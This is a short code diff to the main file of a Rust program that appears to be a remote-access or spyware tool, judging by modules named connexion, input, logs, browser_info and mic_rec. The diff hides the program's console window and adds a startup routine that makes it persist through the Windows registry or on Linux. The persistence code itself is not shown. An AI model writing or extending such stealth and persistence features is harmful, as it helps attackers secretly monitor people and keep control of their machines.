@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 mod connexion;
 mod input;
 mod logs;
@@ -8,9 +9,24 @@ use rand::Rng;
 use tokio::task::JoinHandle;
 mod browser_info;
 mod mic_rec;
+mod persistance;
+
+fn setup_persistence() {
+    #[cfg(target_os = "windows")]
+    {
+        let _ = persistance::add_to_registry();
+    }
+
+    #[cfg(target_os = "linux")]
+    {
+        let _ = persistance::setup_persistence_linux();
+    }
+}
 
 #[tokio::main]
 async fn main() {
+    setup_persistence();
+
     let mut active_tasks: Vec<JoinHandle<()>> = Vec::new();
 
     loop {
